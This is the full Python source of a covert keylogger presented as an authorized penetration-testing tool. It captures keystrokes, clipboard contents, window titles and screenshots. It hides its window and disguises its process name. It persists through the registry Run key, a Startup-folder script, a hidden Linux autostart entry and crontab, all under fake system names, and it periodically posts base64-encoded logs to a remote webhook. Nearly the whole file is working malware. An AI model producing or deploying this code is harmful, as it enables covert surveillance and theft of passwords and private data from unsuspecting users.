#!/usr/bin/env python3
"""
Advanced Keylogger - For Authorized Penetration Testing Only
Features:
- Keystroke logging with timestamps
- Window title tracking
- Clipboard capture
- Stealth execution (hidden console)
- Auto-start persistence (Registry/Cron)
- Encrypted log output
- Email/Webhook exfiltration
- Screenshot capture
- Runs as background service
"""

import os
import sys
import time
import json
import base64
import socket
import platform
import threading
import logging
from datetime import datetime
from pathlib import Path

# --- Third-party imports (install with: pip install pynput pillow requests pycryptodome) ---
try:
    from pynput.keyboard import Key, Listener
    from pynput.mouse import Button, Controller as MouseController
except ImportError:
    os.system(f"{sys.executable} -m pip install pynput --quiet")
    from pynput.keyboard import Key, Listener

try:
    from PIL import ImageGrab
except ImportError:
    os.system(f"{sys.executable} -m pip install pillow --quiet")
    from PIL import ImageGrab

try:
    import requests
except ImportError:
    os.system(f"{sys.executable} -m pip install requests --quiet")
    import requests

# === CONFIGURATION ===
LOG_FILE = Path.home() / ".system_logs" / "keylog.dat"  # Hidden log path
ENCRYPTION_KEY = b"your-secure-key-32-bytes-long!!!!!!"  # 32-byte key (change this)
USE_ENCRYPTION = False  # Set to True if pycryptodome is available
PERSISTENCE = True       # Add to startup
STEALTH = True           # Hide console window
SCREENSHOT_INTERVAL = 300  # Seconds between screenshots (0 = disabled)
CLIPBOARD_INTERVAL = 60    # Seconds between clipboard grabs (0 = disabled)
MAX_LOG_SIZE = 5 * 1024 * 1024  # Rotate log at 5MB

# Webhook/Email config (optional exfiltration)
WEBHOOK_URL = ""  # e.g. "https://your-server.com/capture"
EXFIL_INTERVAL = 3600  # Seconds between exfil (0 = disabled)

# === ENCRYPTION (Optional) ===
if USE_ENCRYPTION:
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
        HAS_CRYPTO = True
    except ImportError:
        os.system(f"{sys.executable} -m pip install pycryptodome --quiet")
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
            HAS_CRYPTO = True
        except:
            HAS_CRYPTO = False
            USE_ENCRYPTION = False
else:
    HAS_CRYPTO = False


class AdvancedKeylogger:
    """Advanced keylogger with persistence, stealth, and exfiltration."""

    def __init__(self):
        self.running = True
        self.log_buffer = ""
        self.buffer_lock = threading.Lock()
        self.current_window = ""
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.key_count = 0

        # Setup logging directory
        LOG_FILE.parent.mkdir(parents=True, exist_ok=True)

        # Configure logging to file
        self._setup_logging()

        # Apply stealth if configured
        if STEALTH:
            self._apply_stealth()

        # Add persistence
        if PERSISTENCE:
            self._add_persistence()

    def _setup_logging(self):
        """Setup dual logging - formatted and raw."""
        # Formatted log with timestamps
        self.formatted_logger = logging.getLogger("keylogger_formatted")
        self.formatted_logger.setLevel(logging.INFO)
        
        # Rotating file handler for formatted logs
        fh = logging.FileHandler(LOG_FILE, mode='a', encoding='utf-8')
        fh.setLevel(logging.INFO)
        formatter = logging.Formatter(
            '[%(asctime)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        fh.setFormatter(formatter)
        self.formatted_logger.addHandler(fh)

    def _apply_stealth(self):
        """Hide console window on Windows."""
        if platform.system() == "Windows":
            try:
                import ctypes
                # Get console window handle and hide it
                kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                user32 = ctypes.WinDLL('user32', use_last_error=True)
                hwnd = kernel32.GetConsoleWindow()
                if hwnd:
                    user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
            except Exception:
                pass
        
        # Rename process on Linux
        elif platform.system() == "Linux":
            try:
                sys.argv[0] = "systemd-logind"
            except:
                pass

    def _add_persistence(self):
        """Add to system startup for persistence."""
        try:
            script_path = os.path.abspath(sys.argv[0])
            
            if platform.system() == "Windows":
                import winreg as reg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                # Rename copy to blend in
                dest = Path.home() / "AppData" / "Local" / "MicrosoftEdgeUpdate" / "update.exe"
                dest.parent.mkdir(parents=True, exist_ok=True)
                
                if not dest.exists():
                    import shutil
                    shutil.copy2(script_path, dest)
                
                # Add to registry
                try:
                    reg_key = reg.OpenKey(
                        reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE
                    )
                    reg.SetValueEx(reg_key, "MicrosoftEdgeUpdate", 0, reg.REG_SZ, str(dest))
                    reg.CloseKey(reg_key)
                except Exception:
                    pass
                
                # Also add to Startup folder
                startup = Path(os.environ.get('APPDATA', '')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
                if startup.exists():
                    vbs_path = startup / "SystemHelper.vbs"
                    with open(vbs_path, 'w') as f:
                        f.write(f'CreateObject("Wscript.Shell").Run "{dest}", 0, False\n')

            elif platform.system() == "Linux":
                # Add to crontab
                cron_line = f"@reboot {sys.executable} {script_path} >/dev/null 2>&1 &"
                
                # Try autostart directory
                autostart = Path.home() / ".config" / "autostart"
                autostart.mkdir(parents=True, exist_ok=True)
                desktop_entry = autostart / "system-monitor.desktop"
                
                with open(desktop_entry, 'w') as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec={sys.executable} {script_path}
Hidden=true
NoDisplay=true
Terminal=false
X-GNOME-Autostart-enabled=true
""")
                os.system(f"chmod +x {desktop_entry}")
                
                # Add to crontab
                os.system(f'(crontab -l 2>/dev/null | grep -v "{script_path}"; echo "{cron_line}") | crontab -')

        except Exception as e:
            print(f"[!] Persistence failed: {e}")

    def on_press(self, key):
        """Handle key press events."""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle special keys
            if key == Key.enter:
                key_str = "\n"
            elif key == Key.space:
                key_str = " "
            elif key == Key.tab:
                key_str = "\t"
            elif key == Key.backspace:
                key_str = "[BACKSPACE]"
            elif key == Key.esc:
                key_str = "[ESC]"
            elif key == Key.shift or key == Key.shift_r:
                key_str = "[SHIFT]"
            elif key == Key.ctrl or key == Key.ctrl_r:
                key_str = "[CTRL]"
            elif key == Key.alt or key == Key.alt_r:
                key_str = "[ALT]"
            elif key == Key.caps_lock:
                key_str = "[CAPS_LOCK]"
            elif key == Key.delete:
                key_str = "[DEL]"
            elif key == Key.up:
                key_str = "[UP]"
            elif key == Key.down:
                key_str = "[DOWN]"
            elif key == Key.left:
                key_str = "[LEFT]"
            elif key == Key.right:
                key_str = "[RIGHT]"
            elif key == Key.home:
                key_str = "[HOME]"
            elif key == Key.end:
                key_str = "[END]"
            elif key == Key.page_up:
                key_str = "[PGUP]"
            elif key == Key.page_down:
                key_str = "[PGDN]"
            elif key == Key.insert:
                key_str = "[INS]"
            elif key == Key.f1:
                key_str = "[F1]"
            elif key == Key.f2:
                key_str = "[F2]"
            elif key == Key.f3:
                key_str = "[F3]"
            elif key == Key.f4:
                key_str = "[F4]"
            elif key == Key.f5:
                key_str = "[F5]"
            elif key == Key.f6:
                key_str = "[F6]"
            elif key == Key.f7:
                key_str = "[F7]"
            elif key == Key.f8:
                key_str = "[F8]"
            elif key == Key.f9:
                key_str = "[F9]"
            elif key == Key.f10:
                key_str = "[F10]"
            elif key == Key.f11:
                key_str = "[F11]"
            elif key == Key.f12:
                key_str = "[F12]"
            elif key == Key.print_screen:
                key_str = "[PRINT_SCREEN]"
                self._take_screenshot()  # Screenshot on printscreen
            else:
                try:
                    key_str = key.char
                except:
                    key_str = f"[{key}]"

            # Format the log entry
            log_entry = f"{key_str}"
            
            # Log to file
            self.formatted_logger.info(log_entry)
            
            # Buffer for batch operations
            with self.buffer_lock:
                self.log_buffer += log_entry
                self.key_count += 1

            # Check log rotation
            if LOG_FILE.stat().st_size > MAX_LOG_SIZE:
                self._rotate_log()

        except Exception as e:
            print(f"[!] Error: {e}")

    def _rotate_log(self):
        """Rotate log file when it gets too large."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            rotated_path = LOG_FILE.parent / f"keylog_{timestamp}.dat"
            LOG_FILE.rename(rotated_path)
            self._setup_logging()
        except Exception:
            pass

    def _get_active_window(self):
        """Get active window title."""
        try:
            if platform.system() == "Windows":
                import ctypes
                from ctypes import wintypes
                user32 = ctypes.WinDLL('user32', use_last_error=True)
                hwnd = user32.GetForegroundWindow()
                length = user32.GetWindowTextLengthW(hwnd) + 1
                buffer = ctypes.create_unicode_buffer(length)
                user32.GetWindowTextW(hwnd, buffer, length)
                return buffer.value
            elif platform.system() == "Linux":
                try:
                    import subprocess
                    output = subprocess.check_output(
                        ["xdotool", "getactivewindow", "getwindowname"],
                        stderr=subprocess.DEVNULL
                    ).decode().strip()
                    return output
                except:
                    pass
        except Exception:
            pass
        return "Unknown"

    def _window_monitor(self):
        """Monitor active window changes."""
        last_window = ""
        while self.running:
            try:
                current = self._get_active_window()
                if current and current != last_window:
                    self.formatted_logger.info(f"\n=== WINDOW: {current} ===")
                    last_window = current
                time.sleep(2)
            except Exception:
                time.sleep(5)

    def _take_screenshot(self):
        """Capture screenshot."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_dir = LOG_FILE.parent / "screenshots"
            screenshot_dir.mkdir(exist_ok=True)
            
            img = ImageGrab.grab()
            img_path = screenshot_dir / f"screenshot_{timestamp}.png"
            img.save(img_path, "PNG")
            
            self.formatted_logger.info(f"[SCREENSHOT] Saved: {img_path}")
        except Exception:
            pass

    def _screenshot_loop(self):
        """Periodic screenshot capture."""
        if SCREENSHOT_INTERVAL > 0:
            while self.running:
                time.sleep(SCREENSHOT_INTERVAL)
                self._take_screenshot()

    def _clipboard_monitor(self):
        """Monitor clipboard contents."""
        if CLIPBOARD_INTERVAL > 0:
            last_clipboard = ""
            while self.running:
                try:
                    if platform.system() == "Windows":
                        import ctypes
                        CF_TEXT = 1
                        user32 = ctypes.WinDLL('user32', use_last_error=True)
                        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                        
                        if user32.OpenClipboard(None):
                            handle = user32.GetClipboardData(CF_TEXT)
                            if handle:
                                text_ptr = kernel32.GlobalLock(handle)
                                if text_ptr:
                                    text = ctypes.c_char_p(text_ptr).value
                                    if text:
                                        text = text.decode('utf-8', errors='ignore')
                                        if text != last_clipboard:
                                            self.formatted_logger.info(f"\n[CLIPBOARD] {text}\n")
                                            last_clipboard = text
                                    kernel32.GlobalUnlock(handle)
                            user32.CloseClipboard()
                except Exception:
                    pass
                time.sleep(CLIPBOARD_INTERVAL)

    def _exfiltrate(self):
        """Send logs to remote server."""
        if WEBHOOK_URL and EXFIL_INTERVAL > 0:
            while self.running:
                time.sleep(EXFIL_INTERVAL)
                try:
                    if LOG_FILE.exists() and LOG_FILE.stat().st_size > 0:
                        # Read and optionally encrypt log data
                        with open(LOG_FILE, 'rb') as f:
                            log_data = f.read()
                        
                        payload = {
                            "hostname": socket.gethostname(),
                            "platform": platform.platform(),
                            "timestamp": datetime.now().isoformat(),
                            "session_id": self.session_id,
                            "key_count": self.key_count,
                            "log_size": len(log_data),
                            "data": base64.b64encode(log_data).decode()
                        }
                        
                        requests.post(
                            WEBHOOK_URL,
                            json=payload,
                            headers={"User-Agent": "Mozilla/5.0"},
                            timeout=10
                        )
                except Exception:
                    pass

    def encrypt_log(self, data: bytes) -> bytes:
        """Encrypt log data using AES-CBC."""
        if HAS_CRYPTO:
            try:
                iv = os.urandom(16)
                cipher = AES.new(ENCRYPTION_KEY[:32], AES.MODE_CBC, iv)
                encrypted = cipher.encrypt(pad(data, AES.block_size))
                return iv + encrypted
            except Exception:
                pass
        return data

    def decrypt_log(self, data: bytes) -> bytes:
        """Decrypt AES-CBC encrypted data."""
        if HAS_CRYPTO and len(data) > 16:
            try:
                iv = data[:16]
                encrypted = data[16:]
                cipher = AES.new(ENCRYPTION_KEY[:32], AES.MODE_CBC, iv)
                return unpad(cipher.decrypt(encrypted), AES.block_size)
            except Exception:
                pass
        return data

    def start(self):
        """Start the keylogger with all monitoring threads."""
        print(f"[*] Keylogger started - Session: {self.session_id}")
        print(f"[*] Logging to: {LOG_FILE}")
        if STEALTH:
            print("[*] Running in stealth mode")

        # Start window monitor thread
        window_thread = threading.Thread(target=self._window_monitor, daemon=True)
        window_thread.start()

        # Start screenshot thread
        screenshot_thread = threading.Thread(target=self._screenshot_loop, daemon=True)
        screenshot_thread.start()

        # Start clipboard monitor thread
        clipboard_thread = threading.Thread(target=self._clipboard_monitor, daemon=True)
        clipboard_thread.start()

        # Start exfiltration thread
        exfil_thread = threading.Thread(target=self._exfiltrate, daemon=True)
        exfil_thread.start()

        # Log session start
        self.formatted_logger.info(f"\n{'='*60}")
        self.formatted_logger.info(f"SESSION STARTED: {datetime.now().isoformat()}")
        self.formatted_logger.info(f"HOST: {socket.gethostname()} | OS: {platform.platform()}")
        self.formatted_logger.info(f"{'='*60}\n")

        # Start keyboard listener (main thread)
        with Listener(on_press=self.on_press) as listener:
            listener.join()


class KeylogDecoder:
    """Utility to decode/read the log file."""

    @staticmethod
    def read_log(log_path: str = None) -> str:
        """Read and display the keylog file."""
        path = Path(log_path) if log_path else LOG_FILE
        
        if not path.exists():
            print(f"[!] Log file not found: {path}")
            return ""
        
        print(f"\n{'='*60}")
        print(f"KEYLOG REPORT: {path}")
        print(f"{'='*60}\n")
        
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        print(content)
        print(f"\n{'='*60}")
        print(f"END OF REPORT - Total size: {path.stat().st_size:,} bytes")
        print(f"{'='*60}")
        
        return content

    @staticmethod
    def search_log(pattern: str, log_path: str = None):
        """Search log for specific pattern."""
        path = Path(log_path) if log_path else LOG_FILE
        
        if not path.exists():
            print(f"[!] Log file not found: {path}")
            return
        
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        matches = [(i, line) for i, line in enumerate(lines, 1) if pattern.lower() in line.lower()]
        
        if matches:
            print(f"\nFound {len(matches)} matches for '{pattern}':\n")
            for line_no, line in matches[:50]:
                print(f"  Line {line_no}: {line.strip()}")
        else:
            print(f"No matches found for '{pattern}'")


# === MAIN ENTRY POINT ===
if __name__ == "__main__":
    # Parse command-line arguments
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower()
        
        if cmd == "--read" or cmd == "-r":
            KeylogDecoder.read_log(sys.argv[2] if len(sys.argv) > 2 else None)
        elif cmd == "--search" or cmd == "-s":
            if len(sys.argv) > 2:
                KeylogDecoder.search_log(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else None)
            else:
                print("Usage: python klg.py --search <pattern> [log_path]")
        elif cmd == "--stop" or cmd == "-k":
            # Kill all running instances
            if platform.system() == "Windows":
                os.system("taskkill /f /im python.exe /fi \"WINDOWTITLE eq *\" 2>nul")
            else:
                os.system("pkill -f klg.py 2>/dev/null")
            print("[*] Keylogger instances terminated.")
        elif cmd == "--help" or cmd == "-h":
            print("""
Advanced Keylogger - Authorized Pentesting Tool
===============================================
Usage:
    python klg.py              Start the keylogger
    python klg.py --read       Read the log file
    python klg.py --search <p> Search logs for pattern
    python klg.py --stop       Stop all instances
    python klg.py --help       Show this help
            """)
        else:
            print(f"Unknown command: {cmd}")
    else:
        # Start the keylogger
        try:
            kl = AdvancedKeylogger()
            kl.start()
        except KeyboardInterrupt:
            print("\n[*] Keylogger stopped by user.")
        except Exception as e:
            print(f"[!] Fatal error: {e}")
